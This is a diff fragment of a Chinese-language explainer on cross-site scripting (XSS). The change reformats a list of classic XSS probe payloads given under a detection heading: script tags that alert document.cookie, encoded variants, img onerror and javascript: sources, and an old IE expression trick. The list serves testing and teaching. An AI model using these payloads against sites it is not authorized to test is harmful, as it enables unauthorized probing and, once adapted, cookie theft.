@@ -6,14 +6,14 @@ XSS攻擊通常指的是通過利用網頁開發時留下的漏洞，通過巧�
 # 檢測方式
 通常有一些方式可以測試網站是否有正確處理特殊字元：
 ```html
-- ><script>alert(document.cookie)</script>
-- ='><script>alert(document.cookie)</script>
-- "><script>alert(document.cookie)</script>
-- <script>alert(document.cookie)</script>
-- <script>alert (vulnerable)</script>
-- %3Cscript%3Ealert('XSS')%3C/script%3E
-- <script>alert('XSS')</script>
-- <img src="javascript:alert('XSS')">
-- <img src="http://xxx.com/yyy.png" onerror="alert('XSS')">
-- <div style="height:expression(alert('XSS'),1)"></div>（這個僅於IE7(含)之前有效）
+><script>alert(document.cookie)</script>
+='><script>alert(document.cookie)</script>
+"><script>alert(document.cookie)</script>
+<script>alert(document.cookie)</script>
+<script>alert (vulnerable)</script>
+%3Cscript%3Ealert('XSS')%3C/script%3E
+<script>alert('XSS')</script>
+<img src="javascript:alert('XSS')">
+<img src="http://xxx.com/yyy.png" onerror="alert('XSS')">
+<div style="height:expression(alert('XSS'),1)"></div>（這個僅於IE7(含)之前有效）
 ```
